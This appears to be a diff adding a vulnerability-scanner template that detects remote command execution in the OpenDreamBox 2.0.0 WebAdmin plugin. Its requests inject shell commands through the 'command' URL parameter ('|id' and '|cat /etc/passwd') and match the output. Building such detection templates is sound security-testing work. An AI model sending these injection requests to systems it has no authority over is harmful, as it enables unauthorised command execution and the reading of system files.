@@ -1,0 +1,29 @@
+id: opendreambox-webadmin-rce
+
+info:
+  name: OpenDreamBox 2.0.0 - Plugin WebAdmin RCE
+  author: 0x_Akoko
+  severity: critical
+  reference: https://cxsecurity.com/issue/WLB-2017070038
+  tags: opendreambox,webadmin,rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/webadmin/script?command=|id"
+      - "{{BaseURL}}/webadmin/script?command=|cat%20/etc/passwd"
+
+    redirects: true
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+          - "groups="
+        condition: and
+
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
